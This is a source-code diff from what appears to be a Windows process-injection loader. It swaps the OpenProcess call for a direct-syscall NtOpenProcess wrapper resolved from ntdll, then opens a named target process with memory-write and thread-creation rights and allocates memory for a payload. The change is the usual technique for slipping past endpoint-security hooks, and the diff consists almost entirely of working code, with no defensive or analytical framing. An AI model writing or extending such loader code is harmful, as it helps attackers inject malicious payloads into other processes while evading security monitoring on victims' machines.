@@ -216,6 +216,14 @@ BOOL ResolveSyscalls( void ) {
     NtQuerySystemInformation_SSN = ssn;
     NtQuerySystemInformation_Addr = sysAddr;
 
+    if ( !GetSyscallInfo( hNtdll, "NtOpenProcess", &ssn, &sysAddr ) ) {
+        printf( "[-] Failed to resolve NtOpenProcess\n" );
+        return FALSE;
+    }
+
+    NtOpenProcess_SSN = ssn;
+    NtOpenProcess_Addr = sysAddr;
+
     return TRUE;
 }
 
@@ -237,14 +245,27 @@ int main( void ) {
 
     wprintf( L"[+] Found process '%ls' with PID: %lu\n", procName, pid );
 
-    HANDLE hProcess = OpenProcess( PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid );
+    NTSTATUS status;
+    // HANDLE hProcess = OpenProcess( PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid );
+    HANDLE hProcess = NULL;
+    OBJECT_ATTRIBUTES objAttr;
+    InitializeObjectAttributes( &objAttr, NULL, 0, NULL, NULL );
+    CLIENT_ID clientId = { 0 };
+    clientId.UniqueProcess = ( HANDLE )( ULONG_PTR )pid;
+    clientId.UniqueThread = NULL;
+    status = Sys_NtOpenProcess( &hProcess, PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, &objAttr, &clientId );
+
+    if ( !NT_SUCCESS( status ) ) {
+        wprintf( L"[-] NtOpenProcess failed: 0x%X\n", status );
+        return 1;
+    }
 
     if ( !hProcess ) {
         wprintf( L"[-] OpenProcess failed with error: %lu\n", GetLastError() );
         return 1;
     }
 
-    NTSTATUS status;
+
     PVOID baseAddress = NULL;
     SIZE_T regionSize = ( SIZE_T )payloadSize;
     status = Sys_NtAllocateVirtualMemory( hProcess, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
